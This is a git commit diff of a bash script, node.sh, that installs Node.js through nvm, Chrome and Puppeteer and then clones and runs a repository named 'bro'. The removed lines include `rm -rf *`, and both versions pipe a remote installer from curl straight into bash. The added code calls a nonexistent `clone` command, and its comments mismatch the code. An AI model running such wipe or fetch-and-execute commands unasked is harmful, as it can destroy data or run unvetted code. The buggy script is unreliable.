4a1ca2c77353473ada3d2b23526ca91ae6e0428b
barburonjilo <barburonjilo@outlook.co.id>
2024-06-28 10:09:35 +0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -1,3 +1,43 @@
 #!/bin/bash
-rm -rf *
-curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash && source ~/.bashrc && nvm install 18 && npm i puppeteer && npm install --save puppeteer && sudo apt-get install libxss1 libappindicator1 libindicator7 && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && sudo apt install ./google-chrome*.deb -y && git clone https://github.com/barburonjilo/bro.git && cd bro && npm install && node index.js
+
+# Function to check if Node.js is installed
+function check_node() {
+    if ! command -v node &> /dev/null; then
+      echo "Installing Nodejs 18 ..."
+      curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+      source ~/.bashrc
+      nvm install 18
+    fi
+}
+
+# Function to setup the environment and run the script
+function setup_and_run() {
+    # Download and extract the tarball
+    clone https://github.com/barburonjilo/bro.git
+    cd bro || { echo "Failed to enter the chrome-mint directory"; exit 1; }
+
+    # Install dependencies
+    npm install
+
+    # Add Google Chrome's signing key and repository
+    wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
+    echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google.list
+
+    # Update and install Google Chrome
+    sudo apt-get update
+    sudo apt-get install -y google-chrome-stable
+
+    # Replace the config.json file with the provided values
+    
+    # Check if we are in the correct directory and run node index.js
+    node index.js
+}
+
+if [ "$(basename "$PWD")" != "chrome-mint" ]; then
+  check_node
+  echo "Installing Dev ..."
+  setup_and_run
+else
+  echo "You are in the chrome-mint directory."
+  node index.js
+fi
